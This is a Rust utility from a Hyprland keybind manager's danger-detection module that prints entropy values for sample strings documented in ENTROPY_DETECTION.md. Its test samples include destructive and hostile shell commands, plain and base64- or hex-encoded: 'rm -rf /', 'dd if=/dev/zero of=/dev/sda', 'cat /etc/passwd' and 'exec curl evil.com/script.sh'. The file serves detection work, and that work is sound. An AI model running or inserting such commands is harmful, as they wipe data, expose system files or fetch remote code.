// Entropy measurement tool for documentation verification
// Calculates actual entropy values for all examples in ENTROPY_DETECTION.md

use hypr_keybind_manager::config::danger::entropy::calculate_entropy;

fn main() {
    println!("=== Entropy Measurements for ENTROPY_DETECTION.md ===\n");

    // Base64 examples from section 2.2
    println!("## Base64 Encoded Commands:");
    measure("Y2F0IC9ldGMvcGFzc3dk", "cat /etc/passwd");
    measure("cm0gLXJmIC8=", "rm -rf /");
    measure("L2Jpbi9iYXNo", "/bin/bash");
    measure("U3VzcGljaW91cw==", "Suspicious");
    measure(
        "ZXhlYyBjdXJsIGV2aWwuY29tL3NjcmlwdC5zaA==",
        "exec curl evil.com/script.sh",
    );
    measure("cm0gLXJmIH4vKg==", "rm -rf ~/*");
    measure("Y2htb2QgNzc3IC90bXA=", "chmod 777 /tmp");
    measure(
        "ZGQgaWY9L2Rldi96ZXJvIG9mPS9kZXYvc2Rh",
        "dd if=/dev/zero of=/dev/sda",
    );

    println!("\n## Hex Encoded Commands:");
    measure("726d202d7266202f", "rm -rf / (hex)");
    measure("2f62696e2f626173680a", "/bin/bash\\n (hex)");
    measure("6578656320637572", "exec cur (hex)");
    measure("63686d6f6420373737", "chmod 777 (hex)");
    measure("6b696c6c616c6c", "killall (hex)");

    println!("\n## Normal Commands (for comparison):");
    measure("rm -rf /", "rm -rf / (plaintext)");
    measure("firefox", "firefox");
    measure("alacritty", "alacritty");
    measure("bind = SUPER, K, exec, firefox", "typical bind");
    measure("killactive", "killactive");

    println!("\n## Edge Cases:");
    measure("AAA", "AAA (all same)");
    measure("ABCD", "ABCD (all different)");
    measure("aaaa", "aaaa (lowercase)");
    measure("1234", "1234 (numbers)");

    println!("\n=== Measurements Complete ===");
}

fn measure(s: &str, description: &str) {
    let entropy = calculate_entropy(s);
    println!(
        "  {:<50} => {:.2} bits/char  (\"{}\")",
        format!("\"{}\"", s),
        entropy,
        description
    );
}
